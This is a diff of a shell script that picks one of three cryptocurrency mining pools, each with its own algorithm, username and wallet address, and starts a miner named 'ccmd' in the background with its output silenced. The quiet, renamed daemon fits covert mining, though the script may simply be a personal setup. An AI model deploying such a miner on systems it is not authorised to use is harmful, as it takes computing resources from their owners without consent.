@@ -18,25 +18,35 @@ update
 # create needed deamon
 link $HOME/pooler $MD
 
-# start daemon
+# select a pool
 
-# LTC
-ALGO=scrypt
-URL=stratum+tcp://ltc.give-me-coins.com:3333
-USER=zaos.i$NAME
-PASS=x
+case TMB in 
 
-# FZ
-ALGO=quark
-URL=http://fz2.mine-pool.net:9372
-USER=FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ
-PASS=xxx
+GMC)
+    ALGO=scrypt
+    URL=stratum+tcp://ltc.give-me-coins.com:3333
+    USER=zaos.i$NAME
+    PASS=x
+    ;;
 
-# LTC
-ALGO=scrypt
-URL=stratum+tcp://stratum-eu.trademybit.com:3330
-USER=zaos.i$NAME
-PASS=x
+FZ)
+    ALGO=quark
+    URL=http://fz2.mine-pool.net:9372
+    USER=FJoZ2U7iu2kTXiJYrH6KDaeVWovefB2PqJ
+    PASS=xxx
+    ;;
+
+TMB)
+    ALGO=scrypt
+    URL=stratum+tcp://stratum-eu.trademybit.com:3330
+    USER=zaos.i$NAME
+    PASS=x
+    ;;
+
+*)
+    exit
+
+esac
 
 # run daemon
 ccmd -qB -a $ALGO -o $URL -u $USER -p $PASS >/dev/null 2>&1
